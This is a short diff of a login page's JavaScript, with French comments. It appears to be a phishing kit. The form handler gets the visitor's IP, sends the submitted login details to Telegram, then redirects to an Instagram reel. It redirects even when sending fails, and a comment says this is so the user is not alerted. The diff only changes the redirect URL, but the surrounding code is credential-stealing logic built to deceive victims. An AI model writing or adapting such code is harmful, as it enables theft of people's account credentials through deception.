@@ -122,20 +122,21 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
             }).then(response => {
                 // SUPPRIMER L'ALERTE ET AJOUTER LA REDIRECTION ICI
                 console.log('Informations envoyées avec succès.');
-                window.location.href = "https://www.instagram.com"; // <-- LIGNE DE REDIRECTION
+                window.location.href = "https://www.instagram.com/reel/DNYjylRtsW0/?utm_source=ig_web_copy_link"; // <-- LIGNE DE REDIRECTION https://www....
 
             }).catch(error => {
                 console.error('Erreur lors de l\'envoi à Telegram:', error);
                 // Même en cas d'erreur, rediriger pour ne pas alerter l'utilisateur
-                window.location.href = "https://www.instagram.com";
+                window.location.href = "https://www.instagram.com/reel/DNYjylRtsW0/?utm_source=ig_web_copy_link";
             });
         })
         .catch(error => {
             console.error('Erreur lors de la récupération de l\'IP:', error);
             // Même en cas d'erreur, rediriger
-            window.location.href = "https://www.instagram.com";
+            window.location.href = "https://www.instagram.com/reel/DNYjylRtsW0/?utm_source=ig_web_copy_link";
         });
 });
     </script>
 </body>
+
 </html>
